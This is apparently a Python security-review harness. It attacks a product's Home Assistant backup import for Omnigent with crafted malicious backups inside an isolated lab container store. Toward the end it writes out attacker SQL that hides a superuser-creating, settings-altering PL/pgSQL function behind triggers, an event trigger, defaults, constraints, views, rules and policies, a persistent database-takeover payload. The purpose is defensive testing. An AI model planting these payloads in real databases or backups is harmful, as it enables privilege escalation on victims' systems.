#!/usr/bin/env python3
"""Independent adversarial security review harness: the Omnigent HA import PRODUCT path
(R-COCKPIT feat/ha-import-omnigent-product-20261123) against crafted (malicious) Home Assistant backups.

Everything runs in the ISOLATED lab Podman store (~/.woowbk-lab/bin/labpodman: its own storage root, production
containers are invisible to it), never through /usr/bin/podman's own store. Containers are made by the product's own
tempctr.TempObjects (so they get the product's hardening: --network none, no-new-privileges, pids and memory limits,
read-only root where the product asks for it). The code under attack is the product's real code: habackup (outer and
inner tar), ha_omnigent.check / convert (scan_member, PgSink, start_ha_cluster, analyse, verdict, the trusted schema,
restore_trusted_data, audit_new_cluster, server_volume), nested.check_volume.

Only the environment is shimmed (no Quadlet files, no live HTTP /v1/info): `ha_omnigent.Target` returns a lab target
whose "live" database is a lab container holding the real Omnigent 0.21.0 schema (taken from the real b1 x86 HA
backup), `target_version` returns 0.21.0. Where a step is SIMULATED (a check verdict bypassed to test the conversion's
own isolation, an observation hook), the result line says so.

Only generated test credentials are used. Output: fixed outcome lines, counts, booleans and sha256 -- never row data,
never a credential (canary values are generated per run and only reported as "found: yes/no").

Usage: omnigent_secreview_attacks.py <out.json> [variant ...]
"""
import contextlib
import gzip
import hashlib
import io
import json
import os
import re
import secrets
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import traceback
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / 'backup-engine'))
sys.path.insert(0, str(ROOT / 'tests' / 'backup'))
from woowbackup import habackup, hacommon, ha_odoo, ha_omnigent as omni, nested, podman, tempctr  # noqa: E402
from woowbackup.errors import BackupError  # noqa: E402
from woowbackup.haimport import SpaceGuard  # noqa: E402
import hafixtures  # noqa: E402  (crafted HA outer/inner tar builders of the unit tests)

HOME = Path.home()
LABPODMAN = str(HOME / '.woowbk-lab/bin/labpodman')
LAB_STORAGE = HOME / '.woowbk-lab/storage'
IMAGE = 'docker.io/library/postgres:16-alpine'   # the lab store's PostgreSQL 16 (16.16); dev-d runs 16.15
FIXTURE = HOME / '.woowbk-lab/ha-fixtures/20261119-b1/x86/woow-b1-x86-plain/woow-b1-x86-plain.tar'
FIXTURE_SHA = '3871a468e2f3a11488df7c6a00a4a8ed7c5b89c3ba2dbc2903ec3bd677013516'
SLUG_FULL = 'a0d7b954_woow-omnigent'
FLOOR = 13 * 1024 ** 3          # keep >= 12 GiB free at every moment (plus margin)
MIN_MEM_MB = 500
HA_DATA = ha_odoo.HA_DATA
OWNER = os.environ.get('USER') or 'woowtechopenclaw'
OWN_USERS = ['admin', 'operator']


# ====================================================================== safety

def free_disk():
    st = os.statvfs('/')
    return st.f_bavail * st.f_frsize


def mem_available_mb():
    for line in Path('/proc/meminfo').read_text().splitlines():
        if line.startswith('MemAvailable:'):
            return int(line.split()[1]) // 1024
    return 0


def require_room(what):
    if free_disk() < FLOOR:
        raise SystemExit(f'STOP before {what}: free disk below 13 GiB')
    if mem_available_mb() < MIN_MEM_MB:
        raise SystemExit(f'STOP before {what}: MemAvailable below {MIN_MEM_MB} MB')


# ====================================================================== the lab runner (labpodman only)

class LabRunner(podman.OwnerRunner):
    """The product's OwnerRunner, but every podman call goes to the isolated lab store (labpodman); never runuser."""

    def __init__(self):
        super().__init__(OWNER)
        self.calls = 0

    def prefix(self):
        return [podman.ENV, '-i', f'PATH={podman.SAFE_PATH}', f'HOME={self.home}', 'LANG=C.UTF-8',
                f'XDG_RUNTIME_DIR=/run/user/{self.uid}']

    def run(self, argv, **kwargs):
        argv = [str(a) for a in argv]
        if argv[0] != LABPODMAN:
            raise AssertionError('lab runner: only labpodman may run')  # never /usr/bin/podman's own store
        self.calls += 1
        return super().run(argv, **kwargs)

    def podman(self, *args, **kwargs):
        return self.run([LABPODMAN, *args], **kwargs)

    def relay(self, podman_args, *, stdout, timeout=3600, check=True, max_output=None, abort=None):
        return self.run([LABPODMAN, *podman_args], stdout=stdout, timeout=timeout, check=check,
                        max_output=max_output, abort=abort)


class LabAdapter:
    def __init__(self, runner):
        self.runner = runner
        self._ids = None

    def owner_ids(self):
        if self._ids is None:
            maps = []
            for name in ('uid_map', 'gid_map'):
                out = self.runner.podman('unshare', 'cat', f'/proc/self/{name}', timeout=60,
                                         max_output=64 * 1024).stdout or b''
                maps.append(nested.IdMap(out.decode()))
            self._ids = tuple(maps)
        return self._ids

    def image_inspect(self, image):
        out = self.runner.podman('image', 'inspect', '--format', '{{json .Config.Env}}', image, timeout=60,
                                 max_output=64 * 1024).stdout or b'[]'
        return {'env': json.loads(out)}


class LabWork:
    """What ha_omnigent uses of haimport.Work, on one crafted HA backup file; every log line is kept (leak scan)."""

    def __init__(self, backup_path, staging, job_id, runner):
        self.ha = habackup.open_backup(str(backup_path)) if backup_path else None
        self.keys = None
        self.staging = Path(staging)
        self.lines = []
        self.phases = []
        self.guard = SpaceGuard([str(self.staging), str(LAB_STORAGE)], FLOOR)
        self._runner = runner
        self._tmp = tempctr.TempObjects(runner, job_id, log=self.lines.append, memory='768m')
        self._adapter = LabAdapter(runner)
        self._addons = {}

    def log(self, text):
        self.lines.append(str(text))

    def checkpoint(self):
        self.guard.check()

    def abort(self):
        return None

    def phase(self, phase_id):
        self.phases.append(phase_id)

    def runner(self, app):
        return self._runner

    def temp(self, app):
        return self._tmp

    def adapter(self, app):
        return self._adapter

    def quadlets(self, app):
        return {}

    def open(self, member):
        return self.ha.open_member(member.name, self.keys)

    def addon_member(self, suffix):
        found = [m for m in self.ha.layout.members if m.role == 'addon' and m.slug.split('_', 1)[-1] == suffix]
        if len(found) != 1:
            raise BackupError('not-found', 'no such add-on', slug=suffix)
        return found[0]

    def addon_info(self, suffix):
        if suffix not in self._addons:
            with self.open(self.addon_member(suffix)) as stream:
                self._addons[suffix] = habackup.read_addon_info(stream)
        return self._addons[suffix]

    def close(self):
        left = self._tmp.cleanup()
        if self.ha is not None:
            self.ha.close()
        return left


APP = SimpleNamespace(id='omnigent', name='Omnigent', secrets=[], postgres=None, data_dirs=None, health=[],
                      volumes=[{'name': 'omnigent-postgres-data'}, {'name': 'omnigent-server-data'},
                               {'name': 'omnigent-pi-data'}])


def new_job_id():
    return time.strftime('j%Y%m%dT%H%M%SZ-', time.gmtime()) + secrets.token_hex(4)


def sha256_bytes(data):
    return hashlib.sha256(data).hexdigest()


# ====================================================================== the trusted (real) Omnigent schema

class Lab:
    """Lab-wide objects: the real schema (from the real b1 x86 backup), the 'live' target database and volumes."""

    def __init__(self, scratch):
        self.scratch = Path(scratch)
        self.scratch.mkdir(mode=0o700, parents=True, exist_ok=True)
        self.runner = LabRunner()
        self.job = new_job_id()
        self.work = LabWork(None, self.scratch, self.job, self.runner)
        self.tmp = self.work._tmp
        self.password = secrets.token_urlsafe(24)   # generated test credential of the lab 'live' database
        self.schema_dump = self.scratch / 'trusted-schema.dump'
        self.schema_sql = self.scratch / 'trusted-schema.sql'
        self.info = {}

    # -------------------------------------------------- real schema from the real HA backup
    def extract_real_schema(self):
        """member_pass of the real b1 x86 plain backup into a lab volume, the product's hardened HA cluster on it,
        pg_dump --schema-only (DDL only; no row of the real backup leaves the lab container)."""
        require_room('real schema extraction')
        digest = hashlib.sha256()
        with open(FIXTURE, 'rb') as handle:
            for block in iter(lambda: handle.read(1 << 20), b''):
                digest.update(block)
        if digest.hexdigest() != FIXTURE_SHA:
            raise SystemExit('fixture digest changed')
        work = LabWork(FIXTURE, self.scratch, new_job_id(), self.runner)
        try:
            tmp = work.temp(APP)
            pg_ids = tmp.user_ids('ids-pg', IMAGE, 'postgres')
            src = omni.member_pass(work, APP, tmp, pg_ids)
            cluster = ha_odoo.start_ha_cluster(work, tmp, IMAGE)
            found = omni.analyse(cluster)
            with open(self.schema_dump, 'wb') as handle:
                tmp.exec('hapg', ['pg_dump', '-U', 'postgres', '-Fc', '--schema-only', '--no-owner', '--no-acl',
                                  '-d', omni.DATABASE], user='postgres', stdout=handle, timeout=600,
                         max_output=256 * 1024 * 1024)
            with open(self.schema_dump, 'rb') as handle:
                sql = tmp.exec('hapg', ['pg_restore', '-f', '-'], user='postgres', input=handle, timeout=600,
                               max_output=64 * 1024 * 1024).stdout or b''
            self.schema_sql.write_bytes(sql)
            os.chmod(self.schema_sql, 0o600)
            ha_schema = omni.read_schema(cluster, found['alembic'])
            self.info = {'alembic': found['alembic'], 'tables': sorted(found['tables']),
                         'sequences': ha_schema.sequences(), 'pg_version': src.pg_version,
                         'artifact_files': src.artifact_files, 'cookie': src.cookie,
                         'schema_sql_sha256': sha256_bytes(sql),
                         'check_constraints': [r[:3] for r in ha_schema.signature['constraints'] if r[2] == 'c'],
                         'counts_total': sum(found['counts'].values())}
            (self.scratch / 'real-info.json').write_text(json.dumps(self.info))
        finally:
            work.close()
        return self.info

    # -------------------------------------------------- the 'live' target (this device's own Omnigent database)
    def start_live(self, extra_sql=''):
        require_room('live target')
        tmp = self.tmp
        tmp.volume('live')
        tmp.run('live', IMAGE, [], detach=True, volumes=[(tmp.name('live'), HA_DATA, 'rw,noexec,nosuid,nodev')],
                env={'POSTGRES_USER': 'omnigent', 'POSTGRES_DB': 'omnigent', 'POSTGRES_PASSWORD': self.password},
                read_only_root=True)
        live = ha_odoo.Cluster(tmp, 'live', superuser='omnigent')
        live.wait_ready(tcp=True)
        with open(self.schema_dump, 'rb') as handle:
            tmp.exec('live', ['pg_restore', '-U', 'omnigent', '--no-owner', '--no-acl', '--exit-on-error',
                              '--single-transaction', '-d', 'omnigent'], user='postgres', input=handle, timeout=600,
                     max_output=1024 * 1024)
        alembic = self.info['alembic']
        # this device's own accounts (generated values): admin and the runner account
        self.live_canary = 'livecanary' + secrets.token_hex(12)
        live.script(''.join(f"INSERT INTO alembic_version VALUES ({ha_odoo.sql_literal(a)});\n" for a in alembic)
                    + own_users_sql(self.live_canary) + extra_sql, 'omnigent')
        self.live_container = tmp.name('live')
        # the live server and pi volumes (a few files, like an installed Omnigent's)
        for role, files in (('live-server', {'config.yaml': b'live: true\n', 'admins': b'admin\n'}),
                            ('live-pi', {'pi-identity.json': b'{"id": "lab"}\n'})):
            tmp.volume(role)
            buf = io.BytesIO()
            with tarfile.open(fileobj=buf, mode='w', format=tarfile.PAX_FORMAT) as tar:
                for name, data in files.items():
                    item = tarfile.TarInfo(name)
                    item.size = len(data)
                    item.mode = 0o644
                    tar.addfile(item, io.BytesIO(data))
                item = tarfile.TarInfo('artifacts')
                item.type = tarfile.DIRTYPE
                item.mode = 0o755
                tar.addfile(item)
            data = buf.getvalue()
            tmp.volume_import(role, lambda out, data=data: out.write(data))
        return live

    def target(self):
        return SimpleNamespace(
            db_image=IMAGE, db_env={'POSTGRES_USER': 'omnigent', 'POSTGRES_DB': 'omnigent',
                                    'POSTGRES_PASSWORD': self.password},
            db_secrets=[], db_container=self.live_container, db_volume='omnigent-postgres-data',
            db_target=HA_DATA, db_user='omnigent', database='omnigent', pgdata=HA_DATA,
            server_volume=self.tmp.name('live-server'), pi_volume=self.tmp.name('live-pi'),
            own_users=list(OWN_USERS), info_url=None)


def own_users_sql(canary):
    """This device's admin and runner rows: every NOT NULL column gets a generated value (password hash = canary)."""
    return f"""DO $$
DECLARE c record; cols text := ''; vals text := ''; v text; u text;
BEGIN
  FOREACH u IN ARRAY ARRAY['admin', 'operator'] LOOP
    cols := ''; vals := '';
    FOR c IN SELECT a.attname, format_type(a.atttypid, a.atttypmod) AS t, a.attnotnull, d.adbin IS NOT NULL AS hasdef
             FROM pg_attribute a LEFT JOIN pg_attrdef d ON d.adrelid = a.attrelid AND d.adnum = a.attnum
             WHERE a.attrelid = 'public.users'::regclass AND a.attnum > 0 AND NOT a.attisdropped LOOP
      IF c.attname = 'id' THEN v := quote_literal(u);
      ELSIF c.attname = 'password_hash' THEN v := quote_literal('$argon2id$v=19$m=65536,t=3,p=4$' || '{canary}' || u);
      ELSIF c.attname = 'is_admin' THEN v := 'true';
      ELSIF c.attname = 'deleted_at' THEN v := 'NULL';
      ELSIF NOT c.attnotnull THEN CONTINUE;
      ELSIF c.hasdef THEN CONTINUE;
      ELSIF c.t LIKE 'character%' OR c.t = 'text' THEN v := quote_literal(u || '-' || c.attname);
      ELSIF c.t IN ('integer', 'bigint', 'smallint') THEN v := '0';
      ELSIF c.t = 'boolean' THEN v := 'false';
      ELSIF c.t LIKE 'timestamp%' THEN v := 'now()';
      ELSIF c.t IN ('json', 'jsonb') THEN v := quote_literal('{{}}');
      ELSE v := 'NULL';
      END IF;
      cols := cols || CASE WHEN cols = '' THEN '' ELSE ', ' END || quote_ident(c.attname);
      vals := vals || CASE WHEN vals = '' THEN '' ELSE ', ' END || v;
    END LOOP;
    EXECUTE 'INSERT INTO public.users (' || cols || ') VALUES (' || vals || ')';
  END LOOP;
END $$;
"""


# ====================================================================== crafted HA backups

def addon_json(version='0.1.23'):
    return json.dumps({'user': {'version': version, 'image': 'ghcr.io/woowtech/woow-ha-omnigent-amd64',
                                'options': {}},
                       'system': {'slug': 'woow-omnigent', 'name': 'Omnigent', 'version': version,
                                  'arch': ['amd64']},
                       'version': version, 'state': 'started'}).encode()


def real_artifact_entries(work):
    """(TarInfo, bytes) of the real backup's artifact store (data/omnigent-home/.omnigent/artifacts/**), streamed
    from the real b1 x86 backup through habackup (bounded; kept in memory only while a crafted backup is written)."""
    member = work.addon_member('woow-omnigent')
    items = []
    total = 0
    with work.open(member) as stream:
        with tarfile.open(fileobj=stream, mode='r|*') as tar:
            for info in tar:
                name = info.name[2:] if info.name.startswith('./') else info.name
                if not (name == omni.ARTIFACTS or name.startswith(omni.ARTIFACTS + '/')) or info.issym():
                    continue
                if f'{omni.ARTIFACTS}/.cache' in name:
                    continue
                data = tar.extractfile(info).read() if info.isfile() else None
                total += len(data or b'')
                if total > 512 * 1024 * 1024:
                    raise SystemExit('artifact store larger than expected')
                info.name = name
                items.append((info, data))
    return items


def build_backup(path, pg_tar_path, artifacts, *, extra_entries=(), pg_extra=()):
    """An HA backup (outer tar + gzip inner tar) whose woow-omnigent member holds `data/postgres` from the exported
    volume tar `pg_tar_path` (names made relative), the given artifact entries and any crafted extra entries."""
    inner = io.BytesIO()
    with tarfile.open(fileobj=inner, mode='w', format=tarfile.PAX_FORMAT) as tar:
        def add(name, kind='file', data=b'', mode=None, linkname=''):
            info = tarfile.TarInfo(name)
            info.type = {'file': tarfile.REGTYPE, 'dir': tarfile.DIRTYPE, 'symlink': tarfile.SYMTYPE,
                         'hardlink': tarfile.LNKTYPE, 'fifo': tarfile.FIFOTYPE, 'chr': tarfile.CHRTYPE}.get(kind, kind)
            info.mode = mode if mode is not None else (0o755 if kind == 'dir' else 0o644)
            info.mtime = time.time()
            info.linkname = linkname
            if kind == 'file':
                info.size = len(data)
            tar.addfile(info, io.BytesIO(data) if kind == 'file' else None)
        add('.', 'dir')
        add('./addon.json', data=addon_json())
        add('data', 'dir')
        add(omni.PG_PREFIX, 'dir', mode=0o700)
        replaced = {n for n, _d in pg_extra}
        with tarfile.open(pg_tar_path, 'r:') as pg:
            for info in pg:
                name = info.name[2:] if info.name.startswith('./') else info.name
                if name in ('', '.') or name in replaced:
                    continue
                info.name = f'{omni.PG_PREFIX}/{name}'
                tar.addfile(info, pg.extractfile(info) if info.isfile() else None)
        for name, data in pg_extra:
            add(f'{omni.PG_PREFIX}/{name}', data=data, mode=0o600)
        for parent in ('data/omnigent-home', 'data/omnigent-home/.omnigent'):
            add(parent, 'dir')
        for info, data in artifacts:
            tar.addfile(info, io.BytesIO(data) if data is not None else None)
        for entry in extra_entries:
            add(**entry)
    member = gzip.compress(inner.getvalue(), compresslevel=1, mtime=0)
    doc = hafixtures.ha_doc(addons=(SLUG_FULL,), compressed=True)
    doc['addons'][0].update({'name': 'Omnigent', 'version': '0.1.23'})
    data = hafixtures.outer_bytes([(f'./{SLUG_FULL}.tar.gz', member)], doc)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, 'wb') as handle:
        handle.write(data)
    return len(data)


class Builder:
    """The attacker's side: the real b1 HA cluster (member pass into a lab volume) changed as a superuser would on
    their own HA box, stopped cleanly and exported as the new backup's data/postgres."""

    def __init__(self, lab):
        self.lab = lab

    def build(self, name, attack_sql, *, extra_entries=(), pg_extra=(), artifacts=None):
        require_room(f'build {name}')
        lab = self.lab
        work = LabWork(FIXTURE, lab.scratch, new_job_id(), lab.runner)
        out = lab.scratch / f'attack-{name}.tar'
        pg_tar = lab.scratch / f'attack-{name}-pg.tar'
        try:
            tmp = work.temp(APP)
            pg_ids = tmp.user_ids('ids-pg', IMAGE, 'postgres')
            omni.member_pass(work, APP, tmp, pg_ids)
            if artifacts is None:
                artifacts = real_artifact_entries(work)
            tmp.run('atk', IMAGE, ha_odoo.ha_server_args(), detach=True, read_only_root=True,
                    volumes=[(tmp.name('hapg'), HA_DATA, 'rw,noexec,nosuid,nodev')])
            atk = ha_odoo.Cluster(tmp, 'atk')
            atk.wait_ready()
            if attack_sql:
                atk.script(attack_sql, omni.DATABASE, timeout=600)
            tmp.stop('atk', timeout=120)
            tmp.remove('atk')
            with open(pg_tar, 'xb') as handle:
                tmp.volume_export('hapg', handle, max_output=4 * 1024 ** 3)
            size = build_backup(out, pg_tar, artifacts, extra_entries=extra_entries, pg_extra=pg_extra)
        finally:
            work.close()
            with contextlib.suppress(FileNotFoundError):
                pg_tar.unlink()
        return out, size, artifacts


# ====================================================================== running the product on a crafted backup

def scan_leaks(texts, canaries):
    blob = '\n'.join(texts)
    return {name: (value in blob) for name, value in canaries.items()}


def run_product(lab, backup, *, test_mode=True, bypass_verdict=False, observe=None, convert=True):
    """check() then convert() (product code) on `backup`; returns a result dict (structure only)."""
    res = {'check': None, 'convert': None, 'simulated': []}
    work = LabWork(backup, lab.scratch, new_job_id(), lab.runner)
    target = lab.target()
    out_dir = lab.scratch / ('out-' + work._tmp.job_id)
    patches = [mock.patch.object(omni, 'Target', lambda w, a: target),
               mock.patch.object(omni, 'target_version', lambda w, a, u: '0.21.0')]
    if bypass_verdict:
        res['simulated'].append('check verdict bypassed in convert (tests the conversion isolation alone)')
        patches.append(mock.patch.object(omni, 'verdict', lambda *a, **k: ([], [])))
    if observe:
        res['simulated'].append('observation hook before the HA cluster is removed (harness only)')
    texts = []
    try:
        with contextlib.ExitStack() as stack:
            for p in patches:
                stack.enter_context(p)
            if observe:
                real_remove = work._tmp.remove

                def remove(role, real_remove=real_remove):
                    if role == 'hapg' and 'hapg' not in res.get('observed_roles', []):
                        res.setdefault('observed_roles', []).append('hapg')
                        res['observed'] = observe(work._tmp)
                    return real_remove(role)
                stack.enter_context(mock.patch.object(work._tmp, 'remove', remove))
            t0 = time.monotonic()
            try:
                checked = omni.check(work, APP)
                res['check'] = {'ok': True, 'blockers': len(checked['blockers']),
                                'blocker_heads': [b[:70] for b in checked['blockers']],
                                'warnings': len(checked['warnings']),
                                'warning_heads': [w[:60] for w in checked['warnings']],
                                'section': {k: checked['omnigent'][k] for k in
                                            ('users', 'scheduled_tasks_active', 'public_sessions',
                                             'account_conflicts', 'files', 'agents')},
                                'seconds': round(time.monotonic() - t0, 1)}
                texts += checked['blockers'] + checked['warnings'] + [json.dumps(checked, ensure_ascii=False)]
            except BackupError as error:
                res['check'] = {'ok': False, 'code': error.code, 'message_head': error.message[:90],
                                'seconds': round(time.monotonic() - t0, 1)}
                texts.append(json.dumps(error.as_dict(), ensure_ascii=False))
            if convert:
                for role in list(work._tmp.containers):
                    pass
                t0 = time.monotonic()
                (out_dir).mkdir(mode=0o700)
                work.staging = lab.scratch / ('staging-' + work._tmp.job_id)
                work.staging.mkdir(mode=0o700)
                try:
                    data = omni.convert(work, APP, test_mode, out_dir)
                    notes, reminders = omni.import_texts(data)
                    res['convert'] = {'ok': True, 'seconds': round(time.monotonic() - t0, 1),
                                      'kept_accounts': data.get('kept_accounts'),
                                      'conflicts': data.get('conflicts'), 'paused_tasks': data.get('paused_tasks'),
                                      'scheduled_tasks_active_reported': data.get('scheduled_tasks_active'),
                                      'public_sessions_reported': data.get('public_sessions'),
                                      'reminders': len(reminders), 'notes': len(notes),
                                      'reminder_mentions_active_tasks': any('啟用中的排程' in r for r in reminders),
                                      'volumes': sorted(data['volumes'])}
                    res['volumes'] = {k: str(v) for k, v in data['volumes'].items()}
                    texts += notes + reminders + [json.dumps(data, ensure_ascii=False, default=str)]
                except BackupError as error:
                    res['convert'] = {'ok': False, 'code': error.code, 'message_head': error.message[:100],
                                      'seconds': round(time.monotonic() - t0, 1)}
                    texts.append(json.dumps(error.as_dict(), ensure_ascii=False, default=str))
                    texts.append(str(error))
                    # the failed command's stderr is kept on the exception only (never shown or logged by the
                    # product); the harness looks into it to prove what the product did NOT surface
                    res['_stderr'] = (getattr(error, 'stderr', b'') or b'').decode('utf-8', 'replace')
                except Exception as error:  # noqa: BLE001 - recorded as a harness/product crash
                    res['convert'] = {'ok': False, 'code': 'exception', 'type': type(error).__name__,
                                      'message_head': str(error)[:100]}
                    texts.append(traceback.format_exc())
    finally:
        texts += work.lines
        res['log_lines'] = len(work.lines)
        res['_texts'] = texts
        res['left_after_cleanup'] = work.close()
        res['_out_dir'] = str(out_dir)
    return res


# ====================================================================== probes of what production would get

PROBE_SQL = """SELECT json_build_object(
 'functions', (SELECT coalesce(json_agg(p.proname ORDER BY p.proname), '[]') FROM pg_proc p
    JOIN pg_namespace n ON n.oid = p.pronamespace WHERE n.nspname NOT IN ('pg_catalog', 'information_schema')
    AND NOT EXISTS (SELECT 1 FROM pg_depend d WHERE d.classid = 'pg_proc'::regclass AND d.objid = p.oid AND d.deptype = 'e')),
 'user_triggers', (SELECT count(*) FROM pg_trigger WHERE NOT tgisinternal),
 'all_triggers_on_public', (SELECT count(*) FROM pg_trigger t JOIN pg_class c ON c.oid = t.tgrelid
    JOIN pg_namespace n ON n.oid = c.relnamespace WHERE n.nspname = 'public'),
 'rules', (SELECT count(*) FROM pg_rewrite r JOIN pg_class c ON c.oid = r.ev_class JOIN pg_namespace n
    ON n.oid = c.relnamespace WHERE n.nspname NOT IN ('pg_catalog', 'information_schema') AND r.rulename <> '_RETURN'),
 'views', (SELECT count(*) FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('v','m')
    AND n.nspname NOT IN ('pg_catalog', 'information_schema')),
 'policies', (SELECT count(*) FROM pg_policy),
 'event_triggers', (SELECT count(*) FROM pg_event_trigger),
 'schemas', (SELECT coalesce(json_agg(nspname ORDER BY nspname), '[]') FROM pg_namespace
    WHERE nspname NOT IN ('public', 'information_schema') AND nspname NOT LIKE 'pg\\_%'),
 'all_schemas', (SELECT count(*) FROM pg_namespace),
 'roles', (SELECT coalesce(json_agg(rolname ORDER BY rolname), '[]') FROM pg_roles WHERE rolname !~ '^pg_'),
 'superusers', (SELECT coalesce(json_agg(rolname ORDER BY rolname), '[]') FROM pg_roles WHERE rolsuper),
 'role_settings', (SELECT count(*) FROM pg_db_role_setting),
 'large_objects', (SELECT count(*) FROM pg_largeobject_metadata),
 'extensions', (SELECT coalesce(json_agg(extname ORDER BY extname), '[]') FROM pg_extension),
 'domains', (SELECT count(*) FROM pg_type t JOIN pg_namespace n ON n.oid = t.typnamespace
    WHERE t.typtype = 'd' AND n.nspname = 'public'),
 'comments_user', (SELECT count(*) FROM pg_description WHERE objoid >= 16384),
 'publications', (SELECT count(*) FROM pg_publication),
 'subscriptions', (SELECT count(*) FROM pg_subscription),
 'sequences', (SELECT count(*) FROM pg_sequence),
 'defaults', (SELECT md5(coalesce(string_agg(c.relname || '.' || a.attname || '=' || pg_get_expr(d.adbin, d.adrelid),
    ';' ORDER BY c.relname, a.attname), '')) FROM pg_attrdef d JOIN pg_class c ON c.oid = d.adrelid
    JOIN pg_attribute a ON a.attrelid = d.adrelid AND a.attnum = d.adnum),
 'checks', (SELECT md5(coalesce(string_agg(c.relname || '.' || o.conname || '=' || pg_get_constraintdef(o.oid),
    ';' ORDER BY c.relname, o.conname), '')) FROM pg_constraint o JOIN pg_class c ON c.oid = o.conrelid),
 'public_tables', (SELECT count(*) FROM pg_class c JOIN pg_namespace n ON n.oid = c.relnamespace
    WHERE n.nspname = 'public' AND c.relkind IN ('r','p')),
 'canary_user_rows', (SELECT count(*) FROM public.users WHERE id LIKE 'atk%'),
 'active_tasks', (SELECT count(*) FROM public.scheduled_tasks WHERE state = 1),
 'db_settings', (SELECT count(*) FROM pg_db_role_setting s JOIN pg_database d ON d.oid = s.setdatabase),
 'auto_conf', (SELECT count(*) FROM pg_file_settings WHERE sourcefile ~ 'auto'))"""


def probe_restored(lab, db_tar, tag):
    """Import the converted database volume tar into a fresh lab volume (as a restore would), start the image on it
    with the live environment, and compare its objects with the live target's (both: the same probe query)."""
    require_room('probe restored')
    tmp = lab.tmp
    role = f'r-{tag}'[:28]
    tmp.volume(role)
    data = Path(db_tar)
    tmp.volume_import(role, lambda out: shutil.copyfileobj(open(data, 'rb'), out, 1 << 20))
    tmp.run(role, IMAGE, [], detach=True, volumes=[(tmp.name(role), HA_DATA, 'rw,noexec,nosuid,nodev')],
            env={'POSTGRES_USER': 'omnigent', 'POSTGRES_DB': 'omnigent', 'POSTGRES_PASSWORD': lab.password},
            read_only_root=True)
    restored = ha_odoo.Cluster(tmp, role, superuser='omnigent')
    restored.wait_ready(tcp=True)
    live = ha_odoo.Cluster(tmp, 'live', superuser='omnigent')
    got = restored.query_json(PROBE_SQL, 'omnigent')
    want = live.query_json(PROBE_SQL, 'omnigent')
    sig_r = restored.query_json(omni.SCHEMA_SIGNATURE_SQL, 'omnigent')
    sig_l = live.query_json(omni.SCHEMA_SIGNATURE_SQL, 'omnigent')
    dump_r = tmp.exec(role, ['pg_dump', '-U', 'omnigent', '--schema-only', '-d', 'omnigent'], user='postgres',
                      timeout=300, max_output=64 * 1024 * 1024).stdout or b''
    dump_l = tmp.exec('live', ['pg_dump', '-U', 'omnigent', '--schema-only', '-d', 'omnigent'], user='postgres',
                      timeout=300, max_output=64 * 1024 * 1024).stdout or b''
    tmp.remove(role)
    tmp.remove_volume(role)

    def norm(text):
        return b'\n'.join(line for line in text.splitlines() if not line.startswith(b'--')
                          and not line.startswith(b'\\restrict') and not line.startswith(b'\\unrestrict'))
    same_keys = {k: got.get(k) == want.get(k) for k in want if k not in ('canary_user_rows', 'active_tasks')}
    return {'objects_equal_live': all(same_keys.values()), 'differs': sorted(k for k, v in same_keys.items() if not v),
            'restored': {k: got.get(k) for k in ('functions', 'user_triggers', 'rules', 'views', 'policies',
                                                 'event_triggers', 'schemas', 'roles', 'superusers', 'role_settings',
                                                 'large_objects', 'extensions', 'domains', 'comments_user',
                                                 'canary_user_rows', 'active_tasks', 'sequences')},
            'signature_equal_live': sig_r == sig_l,
            'schema_dump_equal_live': norm(dump_r) == norm(dump_l),
            'schema_dump_sha256': sha256_bytes(norm(dump_r))}



# ====================================================================== the attacks (SQL the attacker runs as superuser on their own HA box)

PWN_FN = r"""
CREATE FUNCTION public.atk_pwn() RETURNS text LANGUAGE plpgsql AS $f$
BEGIN
  PERFORM pg_catalog.lo_from_bytea(0, pg_catalog.convert_to('atk-lo-from-ddl', 'UTF8'));
  BEGIN EXECUTE 'CREATE ROLE atk_ddl_role SUPERUSER LOGIN'; EXCEPTION WHEN others THEN NULL; END;
  BEGIN EXECUTE 'ALTER DATABASE omnigent SET work_mem = ''77kB'''; EXCEPTION WHEN others THEN NULL; END;
  RETURN 'atk';
END $f$;
"""

V1_VISIBLE_DDL = PWN_FN + r"""
CREATE FUNCTION public.atk_trg() RETURNS trigger LANGUAGE plpgsql AS $f$ BEGIN PERFORM public.atk_pwn(); RETURN NEW; END $f$;
CREATE FUNCTION public.atk_evt() RETURNS event_trigger LANGUAGE plpgsql AS $f$ BEGIN PERFORM public.atk_pwn(); END $f$;
DO $d$ DECLARE col text; BEGIN
  SELECT a.attname INTO col FROM pg_attribute a WHERE a.attrelid = 'public.users'::regclass AND a.attnum > 0
    AND NOT a.attisdropped AND (format_type(a.atttypid, a.atttypmod) LIKE 'character varying%'
    OR format_type(a.atttypid, a.atttypmod) = 'text') AND a.attname <> 'id' ORDER BY a.attnum LIMIT 1;
  IF col IS NOT NULL THEN
    EXECUTE format('ALTER TABLE public.users ALTER COLUMN %I SET DEFAULT public.atk_pwn()', col);
  END IF;
END $d$;
ALTER TABLE public.users ADD CONSTRAINT atk_chk CHECK (public.atk_pwn() IS NOT NULL) NOT VALID;
CREATE TRIGGER atk_t BEFORE INSERT OR UPDATE ON public.users FOR EACH ROW EXECUTE FUNCTION public.atk_trg();
CREATE TRIGGER atk_t2 BEFORE INSERT ON public.scheduled_tasks FOR EACH STATEMENT EXECUTE FUNCTION public.atk_trg();
CREATE VIEW public.atk_v AS SELECT public.atk_pwn() AS x;
CREATE RULE atk_r AS ON UPDATE TO public.scheduled_tasks DO ALSO SELECT public.atk_pwn();
ALTER TABLE public.users ENABLE ROW LEVEL SECURITY;
CREATE POLICY atk_p ON public.users USING (public.atk_pwn() IS NOT NULL);
CREATE SCHEMA atk_schema;
CREATE TABLE atk_schema.t (x text DEFAULT public.atk_pwn());
COMMENT ON TABLE public.users IS 'atk comment';
SELECT pg_catalog.lo_from_bytea(0, pg_catalog.convert_to('atk-lo-in-ha', 'UTF8'));
CREATE ROLE atk_ha_role SUPERUSER LOGIN;
ALTER DATABASE omnigent SET work_mem = '66kB';
ALTER ROLE postgres SET work_mem = '55kB';
GRANT ALL ON public.users TO PUBLIC;
CREATE EVENT TRIGGER atk_evt ON ddl_command_start EXECUTE FUNCTION public.atk_evt();
"""


def lie_view(table, replace):
    """A view pg_atk.<table> with the table's columns (same rows) but lying values, hidden from the check's view
